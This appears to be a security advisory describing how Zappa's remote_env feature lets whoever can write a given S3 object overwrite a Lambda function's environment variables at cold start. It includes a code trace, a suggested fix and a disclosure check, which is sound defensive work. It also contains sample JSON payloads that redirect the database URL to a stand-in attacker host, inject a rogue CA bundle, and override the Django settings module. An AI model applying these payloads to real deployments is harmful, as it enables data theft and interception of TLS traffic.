# VULN-026 — `remote_env` S3 JSON overwrites existing `os.environ` keys at cold start

| | |
|---|---|
| **ID** | VULN-026 |
| **Software** | Zappa |
| **Repository** | https://github.com/zappa/Zappa |
| **Affected version** | 0.62.1 (`zappa/__init__.py:34`); untagged `master`, no tagged release |
| **Commit** | `e9ecb1feea14974f7bd76a908ca22ba1c9860d36` |
| **Severity** | Medium · CVSS 3.1 **6.5** — `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | **CONFIRMED (dynamic)** |
| **Auth required** | Write access to the `REMOTE_ENV` S3 object on a `remote_env` deployment |
| **Attacker gains** | Overwrite the function's environment (secrets, DB DSNs, TLS trust, settings module) at every cold start |

## Summary
When `remote_env` is configured, at cold start Zappa reads a flat JSON object from S3 and copies **every**
key into `os.environ`, explicitly overwriting existing keys with no allow-list. Whoever can write that S3
object controls the function's environment — redirect the DB, weaken TLS, or replace secrets. Verified live:
a pre-existing `APP_DB_URL` was overwritten and `REQUESTS_CA_BUNDLE` injected.

## How it works (mechanism & code trace)
```python
# targets/Zappa/zappa/handler.py:274-281  load_remote_settings()
settings_dict = json.loads(content)
# add each key-value to environment - overwrites existing keys!
for key, value in settings_dict.items():
    ...
    os.environ[str(key)] = value      # <-- clobbers existing values; no allow-list
```
This runs in `__init__` (`handler.py:90-94`) **before** `DJANGO_SETTINGS_MODULE`/`APP_MODULE` are consumed
(`:135-166`). The exploit stubs the S3 fetch to return
`{"APP_DB_URL":"postgres://attacker-db.evil.example/steal","REQUESTS_CA_BUNDLE":"/tmp/attacker-ca.pem"}`;
the real function overwrites the pre-seeded `APP_DB_URL` and injects the CA bundle (`response.txt`).

**The exact defect:** blind overwrite of existing environment from an externally-controlled S3 object
(CWE-15), same "who controls the S3 object" trust boundary as VULN-003.

## Why it is a vulnerability (reasoning)
`os.environ` holds security-relevant configuration (DB DSNs, `DJANGO_SETTINGS_MODULE`, TLS trust via
`REQUESTS_CA_BUNDLE`/`CURL_CA_BUNDLE`, secrets). Letting a mutable S3 object silently overwrite it at cold
start means whoever can write the bucket redirects the app's config — e.g. weakening outbound TLS so the
function trusts an attacker CA, or repointing the DB. `S:C` — config poisoning affects other authorities.

## Reproduction
1. Lab up; run `./run.sh` (drives the real `load_remote_settings` with a stubbed S3 body).
2. Proof (`response.txt`): `APP_DB_URL` overwritten to the attacker DB; `REQUESTS_CA_BUNDLE` injected.
3. Real-world: write `{"DJANGO_SETTINGS_MODULE":"attacker.settings","REQUESTS_CA_BUNDLE":"/tmp/x"}` at the
   `REMOTE_ENV` key; trigger a cold start.
4. Expected `[OK] exploit confirmed` / `==> VULN-026: CONFIRMED`.

## Impact
Redirect app config, weaken TLS verification, or replace secrets at cold start, persistent for the
container's life. **Chains:** pairs with VULN-003 (same S3 boundary) and VULN-008 (event-based env
pollution); can set `DJANGO_SETTINGS_MODULE` to steer VULN-024.

## Suggested fix
- Restrict to an allow-list of expected variable names; never overwrite security-relevant vars already set;
  validate value types.
- Document `REMOTE_ENV` as a trust boundary equivalent to the deployment artifact.

## References
- CWE-15 (External Control of System/Config Setting). Siblings VULN-008, VULN-003.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 65 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `zappa remote_env S3 load_remote_settings os.environ overwrite security` — only s3env/zappa-secrets-manager helper packages and unrelated loaders; no report.
2. `Zappa serverless Python CVE security advisory` / GHSA / Snyk / OSV / repo security-advisories page — no Zappa advisory.
3. GitHub issue search `zappa/Zappa issues?q=remote_env ...` — only #1344 (SSM source request), #1456 (docs gap) and old boto S3-v4 signature failures; nothing about trust or overwrite.
4. README (master) and `handler.py` on master — `remote_env` documented as "a file containing a flat JSON object"; the loader's own comment says it "overwrites existing keys!" and the loop is unchanged.

**Related but distinct public references** (same class or component, not this bug):
- README "Remote Environment Variables (via an S3 file)" — documents the feature with no trust-boundary note.
- VULN-008 sibling (stageVariables) — same CWE-15 pattern from a different source.

**Reasoning:** No public report describes the S3 `remote_env` object as an environment-poisoning / TLS-trust-weakening vector. Caveat: overwriting is intentional (stated in code), so maintainers may view "whoever can write the bucket controls config" as by design; the finding is a trust-boundary observation rather than a classic bug, which tempers confidence.
